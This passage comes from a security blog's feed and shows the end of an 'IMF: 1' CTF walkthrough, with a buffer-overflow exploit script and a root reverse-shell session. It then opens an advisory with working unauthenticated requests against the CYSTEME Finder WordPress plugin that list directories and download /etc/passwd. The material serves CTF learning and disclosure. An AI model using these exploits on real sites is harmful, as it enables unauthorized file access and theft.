+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc6\x57\x26\xd1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;L&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8048563&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;168&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Sending payload of size &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] check for shell&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Upon firing it off, we got a shell as root and the final flag!&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/tmp# nc -lnvp 4443
+listening on [any] 4443 ...
+connect to [192.168.1.60] from (UNKNOWN) [192.168.1.62] 47316
+id
+uid=0(root) gid=0(root) groups=0(root)
+bash -i
+bash: cannot set terminal process group (2019): Inappropriate ioctl for device
+bash: no job control in this shell
+root@imf:/# cd /root
+cd /root
+root@imf:/root# ls -l
+ls -l
+total 8
+-rw-r--r-- 1 root root  28 Oct 11 23:10 Flag.txt
+-rw-r--r-- 1 root root 947 Oct 26 18:57 TheEnd.txt
+root@imf:/root# cat Flag.txt
+cat Flag.txt
+flag6{R2gwc3RQcm90MGMwbHM=}
+root@imf:/root#
+
+root@imf:/root# cat TheEnd.txt
+cat TheEnd.txt
+   ____                        _ __   __   
+  /  _/_ _  ___  ___  ___ ___ (_) /  / /__
+ _/ //  ' \/ _ \/ _ \(_-&amp;lt;(_-&amp;lt;/ / _ \/ / -_)
+/___/_/_/_/ .__/\___/___/___/_/_.__/_/\__/
+   __  __/_/        _                      
+  /  |/  (_)__ ___ (_)__  ___              
+ / /|_/ / (_-&amp;lt;(_-&amp;lt;/ / _ \/ _ \             
+/_/__/_/_/___/___/_/\___/_//_/             
+  / __/__  ___________                     
+ / _// _ \/ __/ __/ -_)                    
+/_/  \___/_/  \__/\__/                     
+
+Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
+Thank you for trying this challenge and please send any feedback.
+
+Geckom
+Twitter: @g3ck0ma
+Email: geckom@redteamr.com
+Web: http://redteamr.com
+
+Special Thanks
+Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
+Web Advice: Menztrual (@menztrual)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>T0w3ntum</name></author><summary type="html">IMF: 1 Walkthrough</summary></entry><entry><title type="html">CYSTEME Finder 3.1 Multiple Vulnerabilities</title><link href="http://localhost:4000/2016-08-28/CYSTEME" rel="alternate" type="text/html" title="CYSTEME Finder 3.1 Multiple Vulnerabilities" /><published>2016-08-28T00:00:00-05:00</published><updated>2016-08-28T00:00:00-05:00</updated><id>http://localhost:4000/2016-08-28/CYSTEME</id><content type="html" xml:base="http://localhost:4000/2016-08-28/CYSTEME">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;p&gt;CYSTEME Finder is a file manager plugin for Wordpress that simplifies file management without the need for FTP or other means. It comes
+in two flavors, free and pro; You can find it here: &lt;a href=&quot;https://wordpress.org/plugins/cysteme-finder/&quot;&gt;CYSTEME Finder, a file explorer&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;CYSTEME fails to check cookies in the request allowing remote attackers to view, download, and upload files to any location on
+remote file system.&lt;/p&gt;
+
+&lt;h3 id=&quot;lfi&quot;&gt;LFI&lt;/h3&gt;
+
+&lt;p&gt;Retrieve all data in the root wordpress directory. This will return JSON.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Exploit:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;http://example.com/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/var/www/wordpress&amp;amp;cmd=open&amp;amp;init=1&amp;amp;tree=1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Reply:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;mime&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;directory&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1471999484&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;read&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;write&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;l1_Lw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;volumeid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;l1_&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Fichiers du site&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Today 20:44&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;locked&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dirs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;options&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Fichiers du site&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tmbUrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;disabled&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;separator&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;copyOverwrite&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;archivers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;create&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x-tar&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x-gzip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x-bzip2&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;extract&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x-tar&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x-gzip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x-bzip2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;files&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;mime&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;directory&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1471999484&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;read&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;write&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;l1_Lw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;volumeid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;l1_&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Fichiers du site&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Today 20:44&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;locked&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dirs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;mime&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;plain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1471714510&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;read&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;write&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;813&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;l1_Lmh0YWNjZXNz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.htaccess&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;phash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;l1_Lw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;20 Aug 2016 13:35&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Simply replacing &lt;strong&gt;wphome&lt;/strong&gt; with any other directory path will return file information for that directory.
+If you want to download that file, get the hash value for the file and include it in the following request:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Will download /etc/passwd&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;http://example.com/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/etc&amp;amp;cmd=file&amp;amp;target=l1_cGFzc3dk&amp;amp;download=1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;file-upload&quot;&gt;File Upload&lt;/h2&gt;
+
+&lt;p&gt;As with downloading the files, you will need the hash value for the target directory. With the hash value, send a payload similar to the
+following.&lt;/p&gt;
+
